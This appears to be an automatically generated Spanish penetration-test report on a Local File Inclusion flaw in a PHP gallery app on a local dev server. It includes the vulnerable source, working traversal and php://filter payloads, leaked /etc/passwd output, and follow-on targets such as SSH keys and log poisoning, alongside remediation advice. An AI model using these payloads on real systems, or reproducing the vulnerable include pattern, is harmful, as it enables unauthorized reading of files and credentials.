# Informe de Análisis de Seguridad - Local File Inclusion (LFI)

**Fecha:** 2026-04-30 16:00:41  
**Objetivo:** http://web.dev.local:8081  
**Tipo de Análisis:** Local File Inclusion (LFI)  
**Estado:** VULNERABILIDAD ENCONTRADA Y EXPLOTADA

---

## 1. Resumen Ejecutivo

Se ha identificado y explotado exitosamente una vulnerabilidad de **Local File Inclusion (LFI)** en la aplicación web "Galería de Arte Virtual" accesible en `http://web.dev.local:8081`. La vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de ficheros del servidor mediante el parámetro `page` del script `gallery.php`.

---

## 2. Descripción de la Vulnerabilidad

### Endpoint Vulnerable
```
http://web.dev.local:8081/gallery.php?page=<PAYLOAD>
```

### Parámetro Vulnerable
- **Parámetro:** `page`
- **Método:** GET

### Código Fuente Vulnerable (gallery.php)

Mediante la técnica PHP Filter Wrapper se pudo obtener el código fuente del archivo vulnerable:

```php
<?php
$page = $_GET['page'] ?? 'modern';
?>
...
<?php
// Check if the page parameter contains file extension
if (strpos($page, '.') !== false) {
    // If it has an extension, use it as-is 
    $file = $page;
} else {
    // Otherwise, assume it's a page in the pages directory
    $file = "pages/" . $page . ".php";
}

if (file_exists($file)) {
    include($file);
} else {
    echo "<div class='error'>";
    echo "<h3>Página no encontrada</h3>";
    echo "<p>El archivo solicitado no existe: " . htmlspecialchars($file) . "</p>";
    echo "</div>";
    // Try to include anyway
    @include($file);
}
?>
```

### Causa Raíz

La aplicación utiliza directamente el valor del parámetro `page` proporcionado por el usuario para construir una ruta de archivo e incluirlo mediante `include()`. Cuando el parámetro contiene un punto (`.`), el valor se usa directamente como ruta, sin ninguna validación ni sanitización. Esto permite ataques de **Path Traversal** usando secuencias `../` para navegar fuera del directorio raíz de la aplicación.

---

## 3. Explotación

### 3.1 Path Traversal - Lectura de /etc/passwd

**Payload utilizado:**
```
http://web.dev.local:8081/gallery.php?page=../../../etc/passwd
```

**Resultado:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### 3.2 PHP Filter Wrapper - Lectura de código fuente

**Payload utilizado:**
```
http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=gallery.php
```

Esta técnica permite leer el código fuente PHP de la aplicación en formato Base64, evitando que el servidor lo ejecute. Se obtuvo el código fuente completo de `gallery.php`.

### 3.3 Path Traversal con profundidad variable

| Payload | Resultado |
|---------|-----------|
| `../../../etc/passwd` | ✅ Éxito - Archivo leído |
| `../../../../etc/passwd` | ✅ Éxito - Archivo leído |
| `/etc/passwd` (ruta absoluta) | ❌ No funciona (el punto hace que se use as-is, pero la ruta absoluta no contiene punto) |
| `php://filter/read=convert.base64-encode/resource=gallery.php` | ✅ Éxito - Código fuente obtenido |

---

## 4. Impacto

| Aspecto | Descripción |
|---------|-------------|
| **Confidencialidad** | **ALTA** - Un atacante puede leer archivos arbitrarios del sistema: configuraciones, credenciales, código fuente, etc. |
| **Integridad** | **MEDIA** - Si se combina con Log Poisoning u otras técnicas, podría derivar en RCE |
| **Disponibilidad** | **BAJA** - La vulnerabilidad no afecta directamente la disponibilidad |
| **CVSS v3 estimado** | **7.5 (High)** |

### Archivos potencialmente accesibles

- `/etc/passwd` - Usuarios del sistema ✅ (confirmado)
- `/etc/shadow` - Hashes de contraseñas (si el proceso corre como root)
- Archivos de configuración de la aplicación con credenciales de BD
- Claves SSH privadas (`/root/.ssh/id_rsa`, `/home/user/.ssh/id_rsa`)
- Logs del sistema (para posible Log Poisoning → RCE)
- Código fuente de la aplicación ✅ (confirmado vía PHP filter)

---

## 5. Recomendaciones

1. **Validar y sanitizar la entrada del usuario:** Implementar una lista blanca de páginas permitidas y rechazar cualquier valor que no esté en dicha lista.

   ```php
   $allowed_pages = ['modern', 'classic', 'abstract', 'about'];
   if (!in_array($page, $allowed_pages)) {
       $page = 'modern'; // Valor por defecto seguro
   }
   $file = "pages/" . $page . ".php";
   ```

2. **Eliminar el uso directo de rutas de usuario:** No pasar valores controlados por el usuario directamente a funciones `include()`, `require()`, `fopen()`, etc.

3. **Deshabilitar wrappers PHP peligrosos:** Configurar `allow_url_include = Off` y restringir el uso de `php://` en `php.ini`.

4. **Aplicar principio de mínimo privilegio:** El proceso del servidor web no debería tener acceso de lectura a archivos sensibles del sistema.

5. **Implementar un WAF:** Detectar y bloquear patrones de path traversal (`../`, `..%2F`, `%2e%2e%2f`, etc.).

6. **Chroot / Containerización:** Aislar el servidor web en un entorno donde no pueda acceder a archivos del sistema operativo.

---

## 6. Evidencias

### Evidencia 1: /etc/passwd leído exitosamente
```
GET /gallery.php?page=../../../etc/passwd HTTP/1.1
Host: web.dev.local:8081

Response: 200 OK
[Contenido del archivo /etc/passwd incluido en la respuesta HTML]
```

### Evidencia 2: Código fuente obtenido via PHP Wrapper
```
GET /gallery.php?page=php://filter/read=convert.base64-encode/resource=gallery.php HTTP/1.1
Host: web.dev.local:8081

Response: 200 OK
[Contenido Base64 del archivo gallery.php en la respuesta HTML]
```

---

## 7. Conclusión

La aplicación **Galería de Arte Virtual** en `http://web.dev.local:8081` presenta una vulnerabilidad crítica de **Local File Inclusion** en el parámetro `page` del archivo `gallery.php`. La falta de validación de la entrada permite la lectura de archivos arbitrarios del servidor mediante técnicas de Path Traversal y PHP Wrappers. Se recomienda aplicar las medidas correctivas descritas de forma inmediata.

---

*Informe generado automáticamente por análisis de seguridad automatizado.*
